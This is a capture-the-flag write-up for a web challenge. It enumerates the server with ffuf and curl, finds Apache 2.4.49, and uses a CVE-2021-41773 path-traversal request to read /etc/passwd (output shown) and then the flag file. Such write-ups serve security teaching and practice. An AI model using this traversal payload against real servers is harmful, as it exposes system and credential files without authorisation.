# Web End-to-End Attack Walker

Accessing the base URL returned a default Apache page:

```html
<html><body><h1>It works!</h1></body></html>
```

No visible routes or links in the HTML source.

Directory Fuzzing with ffuf: We ran enumeration using SecLists/Discovery/Web-Content/common.txt:

```bash
ffuf -u http://ctf-18.security.cs.pub.ro:8081/FUZZ -w ~/SecLists/Discovery/Web-Content/common.txt -fs 20 -t 40
```

**Results:**

```
yaml
Copy
Edit
.htaccess    [Status: 403, Size: 199]
.htpasswd    [Status: 403, Size: 199]
.hta         [Status: 403, Size: 199]
index.html   [Status: 200, Size: 45]
```

- .ht* files were forbidden.
- /index.html showed the default Apache "It works!" page.

No admin panels, APIs, or other content were found.

Using HTTP headers:

```bash
curl -I http://ctf-18.security.cs.pub.ro:8081/
```

Revealed the server was running: **Apache/2.4.49 (Unix)**. This version is vulnerable to:

- Path Traversal: CVE-2021-41773
- Potential RCE (if mod_cgi is enabled)

Tested file disclosure via path traversal: `curl --path-as-is "http://ctf-18.security.cs.pub.ro:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"`. Successfully dumped ***/etc/passwd*** content:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

We then tested common CTF flag locations and found it at: 

```
curl --path-as-is "http://ctf-18.security.cs.pub.ro:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt"
```

Flag: **SSS{p4th_tr4v3rs4l_3v3rywh3r3}**
